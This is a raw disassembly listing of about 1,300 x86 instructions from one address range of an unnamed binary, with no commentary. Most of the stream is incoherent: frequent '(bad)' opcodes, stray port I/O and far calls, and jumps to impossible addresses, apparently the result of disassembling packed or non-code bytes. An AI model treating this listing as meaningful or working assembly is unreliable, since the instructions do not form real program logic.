  40ae99:	div    BYTE PTR [eax]
  40ae9b:	rol    DWORD PTR [edi-0x58],0x3d
  40ae9f:	add    ebx,DWORD PTR ds:0x88f48ea1
  40aea5:	fs gs in al,dx
  40aea8:	(bad)  
  40aea9:	(bad)  
  40aeaa:	ret    0xe3b6
  40aead:	(bad)  
  40aeae:	mov    ?,esp
  40aeb0:	push   ebp
  40aeb2:	rcl    eax,0xff
  40aeb5:	call   0xc5fd86f7
  40aeba:	data16 hlt 
  40aebc:	(bad)  
  40aebd:	jmp    0xe9ce8e00
	...
  40aeea:	add    BYTE PTR [eax],al
  40aeec:	cmp    eax,0x955c835b
  40aef1:	in     al,dx
  40aef2:	(bad)  
  40aef3:	xchg   esi,eax
  40aef4:	cmp    eax,0x3d688464
  40aef9:	pop    ebx
  40aefa:	add    BYTE PTR [eax],al
  40aefc:	das    
  40aefd:	out    dx,eax
  40aefe:	(bad)  
  40aeff:	out    dx,al
  40af00:	adc    DWORD PTR [ebx+0x24bf0875],ecx
  40af06:	mov    al,0xff
  40af08:	push   eax
  40af09:	mov    esi,DWORD PTR [ebp-0x74e714]
  40af0f:	dec    DWORD PTR [edx-0x392f1910]
  40af15:	mov    edi,edi
  40af17:	dec    edx
  40af19:	nop
  40af1a:	idiv   edi
  40af1c:	add    BYTE PTR [ebx-0x6210f78b],cl
  40af22:	mov    cl,0xff
  40af24:	push   eax
  40af25:	mov    esi,DWORD PTR [ebp-0x74b71c]
  40af2b:	(bad)  
  40af2c:	(bad)  
  40af2e:	out    0xb4,al
  40af30:	push   ss
  40af31:	mov    edi,edi
  40af33:	dec    DWORD PTR [edx]
  40af35:	inc    esp
  40af36:	idiv   edi
  40af38:	xor    BYTE PTR [ebx+0x1c2f0875],cl
  40af3e:	mov    al,0xff
  40af40:	push   eax
  40af41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af42:	mov    ch,0xe0
  40af44:	dec    eax
  40af45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af46:	(bad)  
  40af47:	dec    edx
  40af49:	out    dx,eax
  40af4a:	out    0x98,al
  40af4c:	(bad)  
  40af4d:	mov    ds:0x83ff,eax
	...
  40af7a:	rol    BYTE PTR [esi-0x9],cl
  40af7d:	call   DWORD PTR [eax]
  40af7f:	pop    edi
  40af80:	je     0x40af9d
  40af82:	xchg   esp,eax
  40af83:	retf   0xf7cf
  40af86:	add    BYTE PTR [esp+eax*1-0x7a8f0a8b],ah
  40af8d:	fmul   st,st(0)
  40af8f:	mov    ds:0xa507ffff,eax
  40af94:	jne    0x40af9e
  40af96:	iret   
  40af97:	repnz scas eax,DWORD PTR es:[edi]
  40af99:	call   eax
  40af9b:	(bad)
  40af9f:	add    cl,BYTE PTR [esi+0x75]
  40afa2:	ss (bad) 
  40afa5:	mov    al,0xd9
  40afa7:	fmul   QWORD PTR [esi-0x4b]
  40afaa:	fisubr DWORD PTR [edi+ecx*2-0x1]
  40afae:	(bad)  
  40afaf:	cmp    eax,0x84c1ff98
  40afb4:	cdq    
  40afb5:	in     al,dx
  40afb6:	mov    cl,0x7c
  40afb8:	dec    edi
  40afb9:	call   0xff8f7dbd
  40afbe:	test   eax,0xa1f75bd6
  40afc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afc4:	pop    esp
  40afc5:	rcr    BYTE PTR ss:[edi+ecx*2+0x57a1cbff],cl
  40afcd:	dec    DWORD PTR [ecx-0x7e4be467]
  40afd3:	inc    esp
  40afd4:	dec    edi
  40afd5:	mov    ch,0x96
  40afd7:	push   esp
  40afd8:	dec    edi
  40afd9:	jmp    DWORD PTR [esi+0x21]
  40afdc:	xchg   edi,eax
  40afdd:	inc    DWORD PTR [eax]
	...
  40b007:	add    BYTE PTR [ecx+0x4c],ch
  40b00a:	cdq    
  40b00b:	lock imul esp,DWORD PTR [edi+ecx*2-0x18],0xff4f3633
  40b014:	push   ecx
  40b015:	mov    esi,0xee73e94a
  40b01a:	dec    ebp
  40b01b:	inc    DWORD PTR [ecx+0x6e]
  40b01e:	dec    edi
  40b01f:	call   0x439493
  40b024:	pop    es
  40b025:	(bad)  
  40b026:	cli    
  40b027:	call   DWORD PTR [edx-0x57ca083]
  40b02d:	and    cl,bl
  40b02f:	jmp    DWORD PTR [edi+0x46754de7]
  40b035:	or     al,0x26
  40b037:	mov    cl,0x9
  40b039:	stos   BYTE PTR es:[edi],al
  40b03a:	jnp    0x40b081
  40b03c:	add    bl,BYTE PTR [ebp+0x5b7f575b]
  40b042:	jmp    0x91a41b95
  40b047:	shr    dl,1
  40b049:	repnz xchg ebp,eax
  40b04b:	dec    esi
  40b04c:	imul   ebp,edi,0xffffff8d
  40b04f:	fadd   DWORD PTR [ecx+0x3]
  40b052:	sbb    edx,DWORD PTR [ebp+0x41aff2d1]
  40b058:	inc    edx
  40b059:	pop    ebx
  40b05a:	sbb    al,0x7b
  40b05c:	rcr    ah,cl
  40b05e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b05f:	aas    
  40b060:	mov    cl,0xf2
  40b062:	gs cmp bl,0xee
  40b066:	mov    eax,0x565f334e
  40b06b:	sbb    BYTE PTR [eax],al
	...
  40b095:	add    ah,dl
  40b097:	mov    ds:0xfaa603a8,eax
  40b09c:	add    edi,DWORD PTR gs:[esi]
  40b09f:	sub    si,di
  40b0a2:	ret    0xeb92
  40b0a5:	add    edi,DWORD PTR [esi]
  40b0a7:	sbb    ah,BYTE PTR [ebx+ecx*2+0x3e95b3e]
  40b0ae:	jns    0x40b048
  40b0b0:	adc    eax,0xe95b414e
  40b0b5:	fldenv [ecx-0x7c]
  40b0b8:	jmp    0xe9c50a96
  40b0bd:	cmp    bl,0xe6
  40b0c0:	cwde   
  40b0c1:	add    bl,0xe7
  40b0c4:	std    
  40b0c5:	dec    ebp
  40b0c6:	inc    ecx
  40b0c7:	mov    ebp,esi
  40b0c9:	xlat   BYTE PTR ds:[ebx]
  40b0ca:	xor    edx,esi
  40b0cc:	pop    ebx
  40b0cd:	push   eax
  40b0ce:	es mov ah,0x7d
  40b0d1:	add    al,0x3e
  40b0d3:	test   ax,0x3ad8
  40b0d7:	add    al,0xb
  40b0d9:	add    bh,BYTE PTR [esi]
  40b0db:	pop    ebx
  40b0dc:	push   ecx
  40b0dd:	xchg   BYTE PTR [esi-0x6cb31664],al
  40b0e3:	pop    edi
  40b0e4:	add    cl,al
  40b0e6:	add    al,0xa9
  40b0e8:	(bad)  
  40b0e9:	scas   al,BYTE PTR es:[edi]
  40b0ea:	ja     0x40b0f7
  40b0ec:	lea    ebp,[esi+edx*4-0x16]
  40b0f0:	(bad)  
  40b0f1:	sahf   
  40b0f2:	mov    dl,0x8b
  40b0f4:	call   0xff327c1f
  40b0f9:	pusha  
	...
  40b122:	add    BYTE PTR [eax],al
  40b124:	shr    edx,0xf6
  40b127:	xchg   BYTE PTR [ebx+0x73ad84e0],al
  40b12d:	repnz (bad) 
  40b12f:	sbb    edx,esp
  40b131:	mov    esp,0xf2422857
  40b136:	mov    ah,0x59
  40b138:	or     esi,edx
  40b13a:	(bad)  
  40b13b:	pop    esi
  40b13c:	push   ecx
  40b13d:	lds    eax,FWORD PTR [edi-0x58]
  40b140:	cmp    eax,0xb975103
  40b145:	repnz mov BYTE PTR [esi+eiz*1-0x16],ch
  40b14a:	(bad)  
  40b14b:	ds fs icebp 
  40b14e:	data16 jo 0x40b123
  40b151:	call   0x26f6:0xead12e00
  40b158:	add    esi,edx
  40b15a:	xor    al,0x53
  40b15c:	stos   BYTE PTR es:[edi],al
  40b15d:	call   0xefe:0xa94f0100
  40b164:	aad    0xd7
  40b166:	jmp    0x40b166
  40b168:	add    dh,dl
  40b16a:	imul   ebp,ecx,0xa857af65
  40b170:	cmp    eax,0x92f9b4f2
  40b175:	lock (bad) 
  40b177:	out    0x48,al
  40b179:	lds    eax,FWORD PTR [edi+0x28]
  40b17c:	inc    edx
  40b17d:	add    edx,DWORD PTR ds:0x88f0729f
  40b183:	fs jne 0x40b16e
  40b186:	inc    BYTE PTR [eax]
	...
  40b1b0:	add    BYTE PTR [eax],al
  40b1b2:	clc    
  40b1b3:	adc    bh,bh
  40b1b5:	addr16 into 
  40b1b7:	les    edi,FWORD PTR [edi]
  40b1b9:	add    al,cl
  40b1bb:	leave  
  40b1bc:	out    dx,eax
  40b1bd:	imul   DWORD PTR [eax-0x72ca0061]
  40b1c3:	mov    ah,0x3f
  40b1c5:	add    bh,cl
  40b1c7:	xchg   DWORD PTR [ebp-0x7a8a3701],esi
  40b1cd:	loopne 0x40b17f
  40b1cf:	lahf   
  40b1d0:	dec    DWORD PTR [ebp-0x8bb9e]
  40b1d6:	dec    eax
  40b1d7:	lods   al,BYTE PTR ds:[esi]
  40b1d8:	les    bp,DWORD PTR [edi]
  40b1db:	sbb    al,0xff
  40b1dd:	(bad)  
  40b1de:	jb     0x40b16c
  40b1e0:	idiv   edi
  40b1e2:	sbb    BYTE PTR [edi+0x1defaa35],bl
  40b1e8:	jmp    edi
  40b1ea:	arpl   cx,cx
  40b1ec:	(bad)  
  40b1ed:	call   FWORD PTR [esp+ebx*4-0x1edbec8c]
  40b1f4:	xlat   BYTE PTR ds:[ebx]
  40b1f5:	test   DWORD PTR [eax-0x61],0x9f9d7504
  40b1fc:	xor    BYTE PTR [edi-0x8c01e],cl
  40b202:	sbb    BYTE PTR [ebx+0x3fe2c70a],dl
  40b208:	idiv   edi
  40b20a:	dec    eax
  40b20b:	jmp    0xaca8b20e
  40b210:	out    0x95,al
  40b212:	adc    eax,0x8dff9f
	...
  40b23f:	add    dl,ah
  40b241:	sub    esi,edi
  40b243:	dec    DWORD PTR [eax-0x53]
  40b246:	data16 lods al,BYTE PTR ds:[esi]
  40b248:	iret   
  40b249:	sbb    al,0xff
  40b24b:	(bad)  
  40b24c:	rol    BYTE PTR [esi-0x5bf70009],cl
  40b252:	xor    eax,0xc53a3eaa
  40b257:	jmp    DWORD PTR [ecx]
  40b259:	jb     0x40b1ec
  40b25b:	call   DWORD PTR [ecx]
  40b25d:	in     eax,dx
  40b25e:	inc    edx
  40b25f:	je     0x40b28e
  40b261:	test   DWORD PTR [ecx+0x4aa909d0],ecx
  40b267:	add    al,0x73
  40b269:	cld    
  40b26a:	dec    ecx
  40b26b:	xor    cl,al
  40b26d:	jle    0x40b29f
  40b26f:	imul   ecx
  40b271:	rcr    BYTE PTR [esi+0xa],1
  40b274:	stc    
  40b275:	jle    0x40b2a7
  40b277:	neg    ecx
  40b279:	loopne 0x40b27e
  40b27b:	add    BYTE PTR [esi],bh
  40b27d:	add    dh,BYTE PTR [ebx+0x4b346fe7]
  40b283:	(bad)  
  40b284:	mov    ebp,0xb9f76026
  40b289:	add    BYTE PTR [esp+esi*2],0x71
  40b28d:	test   DWORD PTR [ecx+0x4b90b1d4],ecx
  40b293:	add    ch,BYTE PTR [ebx]
  40b295:	push   eax
  40b296:	fdivp  st(7),st
  40b298:	retf   0x3876
  40b29b:	not    DWORD PTR [ecx-0x2c014b68]
  40b2a1:	xchg   ebp,eax
  40b2a2:	push   ebx
  40b2a3:	inc    DWORD PTR [eax]
	...
  40b2cd:	add    BYTE PTR [ecx+0x79db9c99],al
  40b2d3:	inc    eax
  40b2d4:	(bad)  
  40b2d5:	mov    edi,0xbd85eaea
  40b2da:	jp     0x40b324
  40b2dc:	dec    ebx
  40b2dd:	(bad)  
  40b2de:	ds iret 
  40b2e0:	out    dx,eax
  40b2e1:	(bad)  
  40b2e2:	xchg   ebx,eax
  40b2e3:	push   ebp
  40b2e4:	push   ebx
  40b2e5:	call   DWORD PTR [ecx+0x49]
  40b2e8:	div    DWORD PTR [ecx-0x7abe0fb7]
  40b2ee:	pop    edx
  40b2ef:	lock dec ecx
  40b2f1:	(bad)  
  40b2f2:	ds add al,0x3
  40b2f5:	add    BYTE PTR [ebp+0x315fa45b],bh
  40b2fb:	out    dx,eax
  40b2fc:	fld    QWORD PTR [ebx]
  40b2fe:	stos   BYTE PTR es:[edi],al
  40b2ff:	sub    BYTE PTR [edx-0x78],0x2a
  40b303:	out    0xcd,eax
  40b305:	dec    edx
  40b306:	ds addr16 dec ebx
  40b309:	xchg   ebx,ecx
  40b30b:	add    esi,DWORD PTR [esi+0x3d5c014a]
  40b311:	lods   eax,DWORD PTR ds:[esi]
  40b312:	popa   
  40b313:	pop    ecx
  40b314:	jmp    0x1c2f6373
  40b319:	cld    
  40b31a:	loope  0x40b2e5
  40b31c:	dec    esi
  40b31d:	dec    edx
  40b31e:	loope  0x40b30e
  40b320:	pop    ebx
  40b321:	push   edi
  40b322:	shr    esi,1
  40b324:	lea    ecx,[edx+0x4b]
  40b327:	arpl   WORD PTR [ecx+0x7dee9861],dx
  40b32d:	dec    edx
  40b32e:	mov    eax,DWORD PTR [ebx]
  40b330:	jle    0x40b37c
	...
  40b35a:	add    BYTE PTR [eax],al
  40b35c:	mov    ecx,0x99fbf3ee
  40b361:	adc    edx,DWORD PTR [edi-0x6c1156b6]
  40b367:	aaa    
  40b368:	test   eax,0xd34a55ee
  40b36d:	not    DWORD PTR [ebp+0x4a]
  40b370:	xchg   ecx,eax
  40b371:	out    dx,al
  40b372:	mov    ebx,0x8ed3a1fb
  40b377:	dec    edx
  40b378:	sub    esi,0xee71277b
  40b37e:	sub    eax,0x1162eb4a
  40b383:	scas   eax,DWORD PTR es:[edi]
  40b384:	fwait
  40b385:	out    dx,al
  40b386:	sbb    eax,0x1dfbab4a
  40b38b:	dec    edx
  40b38c:	pop    ecx
  40b38d:	out    dx,al
  40b38e:	xchg   ebx,eax
  40b38f:	sti    
  40b390:	pop    ecx
  40b391:	ret    
  40b392:	push   esi
  40b393:	dec    edx
  40b394:	dec    ecx
  40b395:	out    dx,al
  40b396:	xor    ebx,DWORD PTR [edi+0x49]
  40b399:	out    dx,al
  40b39a:	push   ebp
  40b39c:	xchg   esp,eax
  40b39d:	loope  0x40b34f
  40b39f:	out    dx,al
  40b3a0:	xchg   esi,ebp
  40b3a2:	mov    ah,0xd5
  40b3a4:	(bad)  
  40b3a5:	out    dx,al
  40b3a6:	(bad)  
  40b3a7:	shl    edi,1
  40b3a9:	stos   BYTE PTR es:[edi],al
  40b3aa:	(bad)  
  40b3ab:	(bad)  
  40b3ac:	xchg   DWORD PTR [eax-0x11782919],ebp
  40b3b2:	out    0x3d,eax
  40b3b4:	lods   eax,DWORD PTR ds:[esi]
  40b3b5:	in     eax,dx
  40b3b6:	(bad)  
  40b3b7:	mov    esi,0xb6f6fab1
  40b3bc:	xchg   DWORD PTR [ebx],eax
  40b3be:	imul   edi,DWORD PTR [eax+0x0],0x0
	...
  40b3e9:	add    BYTE PTR [edi-0x6da30112],al
  40b3ef:	out    0xfe,al
  40b3f1:	sahf   
  40b3f2:	or     BYTE PTR [ebp-0x1178694f],0x44
  40b3f9:	xchg   ecx,eax
  40b3fa:	jne    0x40b3a7
  40b3fc:	cld    
  40b3fd:	xchg   BYTE PTR [edi-0x12],dh
  40b400:	je     0x40b47f
  40b402:	bound  esi,QWORD PTR [ecx-0x63]
  40b405:	jmp    0xe202d847
  40b40a:	cmp    eax,0xc3558b88
  40b40f:	push   ss
  40b410:	hlt    
  40b411:	sar    DWORD PTR ds:0x89560e81,cl
  40b417:	push   ebp
  40b418:	call   0xff2e6bf6
  40b41d:	jo     0x40b3e8
  40b41f:	icebp  
  40b420:	addr16 jmp 0xc1feb263
  40b426:	pop    eax
  40b427:	xchg   ebx,eax
  40b428:	inc    ecx
  40b429:	jmp    0xa898dfc3
  40b42e:	cmp    eax,0x5f174ee
  40b433:	xchg   edx,eax
  40b434:	ficom  DWORD PTR [esi]
  40b436:	pop    es
  40b437:	loopne 0x40b47d
  40b439:	adc    DWORD PTR [edx-0x60ff838b],ecx
  40b43f:	sbb    bh,bh
  40b441:	addr16 xchg edi,eax
  40b443:	sar    DWORD PTR [edi],0x0
  40b446:	xor    BYTE PTR [esi-0x56],bl
  40b449:	dec    eax
  40b44a:	out    0x58,al
  40b44c:	call   0x40b46e
	...
  40b475:	add    BYTE PTR [eax],al
  40b477:	add    bl,cl
  40b479:	mov    ds:0x1cd70bff,eax
  40b47e:	and    eax,0x688b6a89
  40b483:	add    DWORD PTR [edi],esp
  40b485:	xchg   esp,eax
  40b486:	mov    esi,0xe6ef4aff
  40b48b:	mov    ds:0xffffa3b2,al
  40b490:	cmp    bl,BYTE PTR [edi-0x5c548a01]
  40b496:	jne    0x40b4a0
  40b498:	iret   
  40b499:	lods   eax,DWORD PTR cs:[esi]
  40b49b:	inc    eax
  40b49d:	mov    ds:0x3fbff475,eax
  40b4a2:	mov    al,0xff
  40b4a4:	rcl    BYTE PTR [eax],0x83
  40b4a7:	pop    eax
  40b4a8:	push   ss
  40b4a9:	push   edi
  40b4aa:	push   DWORD PTR [ebp-0x31]
  40b4ad:	nop
  40b4ae:	(bad)  
  40b4af:	cld    
  40b4b0:	xor    BYTE PTR [ebx-0x5cdc8a01],ah
  40b4b6:	jne    0x40b4c0
  40b4b8:	nop    DWORD PTR [ebp-0x3dceff01]
  40b4bf:	add    al,0xa7
  40b4c1:	mov    ebp,0x2c24ec89
  40b4c6:	cld    
  40b4c7:	push   0xffffff97
  40b4c9:	push   cs
  40b4ca:	push   cs
  40b4cb:	dec    edx
  40b4cd:	lock out 0xe5,al
  40b4d0:	ret    0xffa3
  40b4d3:	mov    DWORD PTR [edx+0x57006894],ebx
  40b4d9:	xchg   ebx,eax
  40b4da:	mov    esi,0x68
	...
  40b503:	add    BYTE PTR [eax],al
  40b505:	add    BYTE PTR [edx],ch
  40b507:	sar    BYTE PTR [edi],0x0
  40b50a:	fisub  DWORD PTR ds:[ecx+0x58]
  40b50e:	inc    DWORD PTR [ecx]
  40b510:	dec    eax
  40b511:	jne    0x40b549
  40b513:	dec    edx
  40b514:	xor    ebx,ecx
  40b516:	inc    ecx
  40b517:	in     eax,dx
  40b518:	inc    esi
  40b519:	jne    0x40b555
  40b51b:	in     eax,0xcc
  40b51d:	pop    es
  40b51e:	es hlt 
  40b520:	cwde   
  40b521:	jmp    FWORD PTR [ecx]
  40b523:	stos   DWORD PTR es:[edi],eax
  40b524:	inc    ecx
  40b525:	add    al,0x3e
  40b527:	daa    
  40b528:	jnp    0x40b516
  40b52a:	mov    ebp,0x3e6a47bd
  40b52f:	cwde   
  40b530:	hlt    
  40b531:	(bad)  
  40b532:	xchg   ebx,eax
  40b533:	jmp    0x8946:0xacd3aa5a
  40b53a:	and    DWORD PTR [esi-0x530e0025],0xffffff85
  40b541:	push   0xffc599d5
  40b546:	pop    ecx
  40b547:	shr    BYTE PTR [ebx-0x2f3ac1c0],cl
  40b54d:	pop    es
  40b54e:	out    0x66,al
  40b550:	sub    eax,0x447c9ff
  40b555:	push   0xffc53b13
  40b55a:	and    DWORD PTR [ecx],edx
  40b55c:	lods   al,BYTE PTR ds:[esi]
  40b55d:	inc    eax
  40b55e:	ds jge 0x40b572
  40b561:	stos   BYTE PTR es:[edi],al
  40b562:	test   dl,0x2
  40b565:	call   0xff878671
	...
  40b592:	add    BYTE PTR [eax],al
  40b594:	inc    ebp
  40b595:	inc    edx
  40b596:	shl    BYTE PTR [ebx],1
  40b598:	es sti 
  40b59a:	stos   DWORD PTR es:[edi],eax
  40b59b:	inc    eax
  40b59c:	rcr    BYTE PTR ds:[edx+0x25],cl
  40b5a0:	retf   0x472c
  40b5a3:	push   eax
  40b5a4:	out    0x1,al
  40b5a6:	add    ebp,edi
  40b5a8:	mov    al,0x19
  40b5aa:	pop    edx
  40b5ab:	pop    eax
  40b5ac:	call   FWORD PTR [edx-0x17]
  40b5af:	mov    bl,0x60
  40b5b1:	gs icebp 
  40b5b3:	pop    ebx
  40b5b4:	adc    dl,BYTE PTR cs:[esi]
  40b5b7:	inc    edi
  40b5b8:	push   cx
  40b5ba:	pop    ecx
  40b5bb:	inc    edi
  40b5bc:	dec    ecx
  40b5bd:	jmp    0x40b63a
  40b5bf:	inc    edi
  40b5c0:	inc    ecx
  40b5c1:	gs icebp 
  40b5c3:	pop    ebx
  40b5c4:	retf   0xf5b8
  40b5c7:	inc    esi
  40b5c8:	pop    es
  40b5c9:	push   ds
  40b5ca:	in     eax,0x3
  40b5cc:	xchg   ebx,eax
  40b5cd:	(bad)  
  40b5ce:	aam    0x82
  40b5d0:	cli    
  40b5d1:	out    0x36,eax
  40b5d3:	scas   eax,DWORD PTR es:[edi]
  40b5d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5d5:	pop    ebx
  40b5d6:	inc    ebx
  40b5d7:	cmc    
  40b5d8:	adc    BYTE PTR [ecx-0x1f],dh
  40b5db:	pop    ebx
  40b5dc:	pop    eax
  40b5dd:	mov    eax,0xa0b746c5
  40b5e2:	mov    ebp,0x2139337a
  40b5e7:	vpmullw xmm5,xmm1,xmm3
  40b5eb:	adc    DWORD PTR [esi-0x64],esi
  40b5ee:	jmp    0x159bd776
  40b5f3:	mov    ebx,0xc5302461
	...
  40b620:	add    BYTE PTR [eax],al
  40b622:	rcl    DWORD PTR [ecx+0x5ba5ba81],1
  40b628:	jmp    0xc4b03827
  40b62d:	lods   eax,DWORD PTR ds:[esi]
  40b62e:	mov    eax,ds:0xb1462fca
  40b633:	jae    0x40b660
  40b635:	lods   eax,DWORD PTR ds:[esi]
  40b636:	(bad)  
  40b637:	pop    edx
  40b638:	mov    ecx,0x5daeeb5b
  40b63d:	inc    esi
  40b63e:	out    dx,al
  40b63f:	jb     0x40b62a
  40b641:	add    esp,DWORD PTR [ecx+0x1346b8a9]
  40b647:	push   ebx
  40b648:	push   ecx
  40b649:	inc    ebx
  40b64a:	imul   ebp,edx,0x3d
  40b64d:	pop    ebx
  40b64e:	test   al,0xba
  40b650:	push   DWORD PTR ds:0xa700f5f8
  40b656:	mov    ebp,0xf79c0029
  40b65b:	mov    al,ds:0xa3fddafc
  40b660:	(bad)  
  40b661:	push   ss
  40b662:	clc    
  40b663:	jmp    0x6275f659
  40b668:	jne    0x40b6a6
  40b66a:	clc    
  40b66b:	outs   dx,DWORD PTR ds:[esi]
  40b66c:	cld    
  40b66d:	dec    BYTE PTR [ecx]
  40b66f:	(bad)  
  40b670:	call   0xff2a8d58
  40b675:	mov    fs,ebx
  40b677:	adc    al,dl
  40b679:	in     eax,dx
  40b67a:	cmp    eax,0xbfcd8b90
  40b67f:	push   ds
  40b680:	cld    
  40b681:	inc    ebx
  40b682:	cmp    dh,BYTE PTR [ebp+0x12]
  40b685:	into   
	...
  40b6ae:	add    BYTE PTR [eax],al
  40b6b0:	stc    
  40b6b1:	popa   
  40b6b2:	call   0xff2a5d4c
  40b6b7:	jo     0x40b672
  40b6b9:	in     eax,0x67
  40b6bb:	jmp    0x41feb0fd
  40b6c0:	cwde   
  40b6c1:	add    BYTE PTR [ecx-0x17],0x5
  40b6c5:	xchg   edi,eax
  40b6c6:	pop    ecx
  40b6c7:	sub    BYTE PTR [edx-0x16],al
  40b6ca:	je     0x40b6ad
  40b6cc:	jne    0x40b6a0
  40b6ce:	xlat   BYTE PTR ds:[ebx]
  40b6cf:	mov    es,WORD PTR [ebx+0x7b8574ea]
  40b6d5:	jo     0x40b6df
  40b6d7:	xchg   ecx,eax
  40b6d8:	jno    0x40b691
  40b6da:	(bad)  
  40b6db:	jbe    0x40b752
  40b6dd:	sbb    eax,0xd4d8e904
  40b6e2:	jmp    0x40b74c
  40b6e4:	inc    BYTE PTR [esi]
  40b6e6:	neg    DWORD PTR [esi+0x3]
  40b6e9:	fadd   DWORD PTR [ebp+edx*2-0x36]
  40b6ed:	call   0x30439466
  40b6f2:	stos   BYTE PTR es:[edi],al
  40b6f3:	add    bh,cl
  40b6f5:	sbb    al,0xff
  40b6f7:	out    0x85,eax
  40b6f9:	jb     0x40b6fb
  40b6fb:	add    BYTE PTR [ebp+ebx*4+0xf],bl
  40b6ff:	test   DWORD PTR [esi+0x1000005d],esi
  40b705:	stos   BYTE PTR es:[edi],al
  40b706:	test   BYTE PTR [eax],0x67
  40b709:	pop    ebp
  40b70a:	add    bh,al
  40b70c:	mov    ds:0x5707ff99,al
  40b711:	pop    ebp
  40b712:	push   0x0
	...
  40b73c:	add    BYTE PTR [eax],al
  40b73e:	lods   eax,DWORD PTR ds:[esi]
  40b73f:	pop    ebp
  40b740:	push   0x0
  40b742:	int    0x5c
  40b744:	lea    eax,[ebp+0x33]
  40b747:	lods   eax,DWORD PTR ds:[esi]
  40b748:	mov    eax,DWORD PTR [ebp-0x67cd]
  40b74e:	addr16 sahf 
  40b750:	jne    0x40b74a
  40b752:	clc    
  40b753:	sbb    ebx,edi
  40b755:	call   0x41298d
  40b75a:	sbb    al,0x9d
  40b75c:	je     0x40b763
  40b75e:	out    dx,al
  40b75f:	or     BYTE PTR [eax],al
  40b761:	add    bh,ah
  40b763:	add    al,0x85
  40b765:	dec    eax
  40b766:	es pop edi
  40b768:	push   DWORD PTR [ebp+0xb]
  40b76b:	test   DWORD PTR [ebp+0x509f98b2],eax
  40b771:	mov    edx,DWORD PTR [edi-0x4f0b7a8f]
  40b777:	lahf   
  40b778:	call   DWORD PTR [eax+0x5]
  40b77b:	xchg   DWORD PTR [ebp-0x4e],esi
  40b77e:	mov    eax,0x3785899f
  40b783:	xchg   edi,eax
  40b784:	(bad)  
  40b785:	(bad)  
  40b786:	mov    edi,0x18ffae23
  40b78b:	add    bh,bh
  40b78d:	test   BYTE PTR [di+0x3f],dh
  40b792:	clc    
  40b793:	fsubr  st,st(7)
  40b795:	idiv   DWORD PTR [esi]
  40b797:	xchg   ecx,eax
  40b798:	inc    esp
  40b799:	call   DWORD PTR [ebx-0x24]
  40b79c:	mov    edx,0x388a3e40
  40b7a1:	mov    cl,0x0
	...
  40b7cb:	add    BYTE PTR [ecx+0x29],bh
  40b7ce:	jp     0x40b755
  40b7d0:	pop    edx
  40b7d1:	sub    DWORD PTR [edi+edi*8-0x2c],eax
  40b7d5:	icebp  
  40b7d6:	fisub  DWORD PTR [edx+0x7]
  40b7d9:	mov    bl,0x2
  40b7db:	call   DWORD PTR [ebx+0x51ff4c42]
  40b7e1:	push   ecx
  40b7e2:	push   cs
  40b7e3:	stos   BYTE PTR es:[edi],al
  40b7e4:	div    BYTE PTR [edx+0x2393e802]
  40b7ea:	inc    esp
  40b7eb:	inc    edi
  40b7ed:	jle    0x40b846
  40b7ef:	div    DWORD PTR [ecx]
  40b7f1:	icebp  
  40b7f2:	xlat   BYTE PTR ds:[ebx]
  40b7f3:	jmp    DWORD PTR [ecx+0x3e40a9dc]
  40b7f9:	add    DWORD PTR [ecx-0x10],edi
  40b7fc:	adc    DWORD PTR [ecx],ecx
  40b7fe:	inc    ebx
  40b7ff:	dec    DWORD PTR [ebx-0x24]
  40b802:	retf   
  40b803:	inc    eax
  40b804:	sbb    dl,BYTE PTR ds:[ebx-0x72defe4f]
  40b80b:	test   esi,esp
  40b80d:	mov    al,0x42
  40b80f:	inc    ebx
  40b811:	jbe    0x40b873
  40b813:	imul   ecx
  40b815:	mov    eax,0x9b6267d3
  40b81a:	(bad)  
  40b81d:	mov    ?,WORD PTR [edi+esi*8]
  40b820:	rcl    eax,1
  40b822:	inc    edx
  40b823:	xor    eax,0xffc53994
  40b828:	(bad)  [ebp+0x75]
  40b82b:	(bad)  
  40b82c:	mov    ecx,0x7442ec
	...
  40b859:	add    BYTE PTR [edi+0x75],dl
  40b85c:	sbb    esp,0x44378b1
  40b862:	sub    ebx,DWORD PTR [ebx-0x7]
  40b865:	inc    edx
  40b866:	dec    esi
  40b867:	fsub   DWORD PTR [ebx+0x24]
  40b86a:	mov    edi,esp
  40b86c:	push   ebp
  40b86d:	aam    0xa1
  40b86f:	and    DWORD PTR [edi+0x43],edi
  40b872:	xor    ebx,0x6e7e0edc
  40b878:	out    0xd3,eax
  40b87a:	pop    ecx
  40b87b:	xor    eax,0x1f694387
  40b880:	fs and al,0x69
  40b883:	out    0x25,eax
  40b885:	sbb    DWORD PTR [esi],edi
  40b887:	pop    ebx
  40b888:	jmp    0x1e3f4c13
  40b88d:	inc    ebx
  40b88e:	dec    ecx
  40b88f:	pop    edx
  40b890:	xchg   ebp,eax
  40b891:	fidivr DWORD PTR [ebp+eiz*4-0x18c6c4ec]
  40b898:	call   0x341b3c54
  40b89d:	sub    al,0x31
  40b89f:	out    0xed,eax
  40b8a1:	add    ebp,DWORD PTR [edx+0x3e0451a0]
  40b8a7:	neg    BYTE PTR [esi-0x3eac74be]
  40b8ad:	outs   dx,DWORD PTR ds:[esi]
  40b8ae:	aam    0xe6
  40b8b0:	int    0x42
  40b8b2:	retf   
  40b8b3:	idiv   DWORD PTR [ebp+0x33e6f942]
  40b8b9:	or     al,0xe6
  40b8bb:	pop    ebx
  40b8bc:	add    BYTE PTR [edx+0x0],0x0
	...
  40b8e8:	jmp    0xe96c2cd3
  40b8ed:	out    0xa5,al
  40b8ef:	inc    edx
  40b8f0:	push   ebx
  40b8f1:	push   ebx
  40b8f2:	xchg   ecx,eax
  40b8f3:	xor    eax,0x4295e6a4
  40b8f8:	xchg   ebx,eax
  40b8f9:	call   DWORD PTR [ebp-0x4193ebe]
  40b8ff:	or     esp,DWORD PTR [esi-0x4ebdad01]
  40b905:	out    0xff,al
  40b907:	cmp    ebx,DWORD PTR [ebp-0x12]
  40b90a:	(bad)  
  40b90b:	outs   dx,BYTE PTR ds:[esi]
  40b90c:	cld    
  40b90d:	outs   dx,DWORD PTR ds:[esi]
  40b90e:	or     BYTE PTR [ecx-0x2f],dl
  40b911:	mov    ah,0xfe
  40b913:	pop    esi
  40b914:	cld    
  40b915:	scas   eax,DWORD PTR es:[edi]
  40b916:	jecxz  0x40b976
  40b918:	cld    
